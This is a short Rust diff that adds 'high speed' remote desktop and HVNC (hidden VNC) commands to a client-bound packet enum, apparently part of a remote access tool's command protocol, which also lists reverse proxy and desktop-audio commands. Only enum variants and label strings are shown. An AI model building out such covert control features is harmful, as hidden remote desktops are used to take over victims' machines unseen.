@@ -120,6 +120,11 @@ pub enum ClientboundPacket {
     Reconnect,
     Disconnect,
     StartRemoteDesktop(RemoteDesktopConfig),
+    StartHighSpeedRemoteDesktop {
+        ticket: String,
+        room: String,
+        config: RemoteDesktopConfig,
+    },
     StopRemoteDesktop,
     StartRemoteDesktopAudio,
     StopRemoteDesktopAudio,
@@ -162,6 +167,10 @@ pub enum ClientboundPacket {
     StopReverseProxy,
 
     StartHVNC,
+    StartHighSpeedHVNC {
+        ticket: String,
+        room: String,
+    },
     StopHVNC,
     StartHVNCFrameAudio,
     StopHVNCFrameAudio,
@@ -217,6 +226,7 @@ impl Packet for ClientboundPacket {
             ClientboundPacket::Reconnect => "Reconnect",
             ClientboundPacket::Disconnect => "Disconnect",
                     ClientboundPacket::StartRemoteDesktop(_) => "Start Remote Desktop",
+            ClientboundPacket::StartHighSpeedRemoteDesktop { .. } => "Start High Speed Remote Desktop",
             ClientboundPacket::StopRemoteDesktop => "Stop Remote Desktop",
             ClientboundPacket::StartRemoteDesktopAudio => "Start Remote Desktop Audio",
             ClientboundPacket::StopRemoteDesktopAudio => "Stop Remote Desktop Audio",
@@ -256,6 +266,7 @@ impl Packet for ClientboundPacket {
             ClientboundPacket::StopReverseProxy => "Stop Reverse Proxy",
 
             ClientboundPacket::StartHVNC => "Start HVNC",
+            ClientboundPacket::StartHighSpeedHVNC { .. } => "Start High Speed HVNC",
             ClientboundPacket::StopHVNC => "Stop HVNC",
             ClientboundPacket::StartHVNCFrameAudio => "Start HVNC Frame Audio",
             ClientboundPacket::StopHVNCFrameAudio => "Stop HVNC Frame Audio",
